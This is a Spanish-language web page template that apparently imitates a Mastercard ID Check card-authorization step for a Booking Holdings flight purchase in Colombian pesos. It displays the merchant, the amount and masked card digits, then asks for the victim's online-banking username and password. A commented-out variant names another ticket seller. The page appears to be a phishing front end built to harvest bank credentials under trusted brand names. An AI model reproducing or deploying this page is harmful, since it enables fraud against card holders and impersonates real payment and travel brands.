<script>
    // Variables por defecto
    let flightCalculation = {
        finalTotal: 100000
    };
    let lastFourDigits = "1234";
    
</script>

<nav class="w-full shadow-lg">
    <div class="max-w-[1100px] mx-auto py-8 flex flex-row items-center justify-between px-4">
        <span></span>
        <img src="/assets/logos/mc_id_check_1.webp" alt="mc_check" class="w-[150px]">
    </div>
</nav>

<main class="bg-gray-50 min-h-screen w-full">
    <div class="max-w-[1100px] mx-auto py-20 px-4">
        <p class="text-xl text-center mb-10 font-bold">
            Autorización de transacción
        </p>
        <p class="text-gray-900 text-md text-center px-10 mb-10">
            La transacción que intenta realizar en <b>BOOKING HOLDINGS LLC</b> por <b>$ {flightCalculation.finalTotal.toLocaleString()} COP</b> debe ser autorizada. Por favor verifica la siguiente información:
        </p>

        <div class="max-w-2xl mx-auto">
            <table class="w-full">
                <tbody>
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Comercio:</b>
                        </td>
                        <td class="text-left py-2">
                            <b class="text-gray-700">BOOKING HOLDINGS LLC</b>
                        </td>
                    </tr>
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Monto:</b>
                        </td>
                        <td class="text-left py-2">
                            <b class="text-gray-700">$ {flightCalculation.finalTotal.toLocaleString()} COP</b>
                        </td>
                    </tr>
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Número de tarjeta:</b>
                        </td>
                        <td class="text-left py-2">
                            <b class="text-gray-700">•••• •••• •••• {lastFourDigits}</b>
                        </td>
                    </tr>
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Usuario:</b>
                        </td>
                        <td class="text-left py-2">
                            <input 
                                type="text" 
                                id="usuario" 
                                name="usuario"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                                placeholder="Ingrese su usuario"
                            />
                        </td>
                    </tr>
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Contraseña:</b>
                        </td>
                        <td class="text-left py-2">
                            <input 
                                type="password" 
                                id="password" 
                                name="password"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                                placeholder="Ingrese su contraseña"
                            />
                        </td>
                    </tr>
                </tbody>
            </table>
            
            <div class="mt-6">
                <button 
                    type="submit"
                    class="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition duration-200"
                >
                    Autorizar Transacción
                </button>
            </div>
        </div>

        <!-- <div>
            <div class="mb-6">
                <p class="text-gray-700 mb-2">
                    <b>Comercio:</b> TIQUETES BARATOS S.A.S
                </p>
                <p class="text-gray-700 mb-2">
                    <b>Monto:</b>  $ {flightCalculation.finalTotal.toLocaleString()} COP
                </p>
                <p class="text-gray-700 mb-2">
                    <b>Número de tarjeta:</b> •••• •••• •••• {lastFourDigits}
                </p>
            </div>

            <p class="text-gray-900 text-md mt-6 mb-4">Ingrese los datos de su Banca Virtual:</p>
            {@html renderForm()}

        </div> -->
    </div>
</main>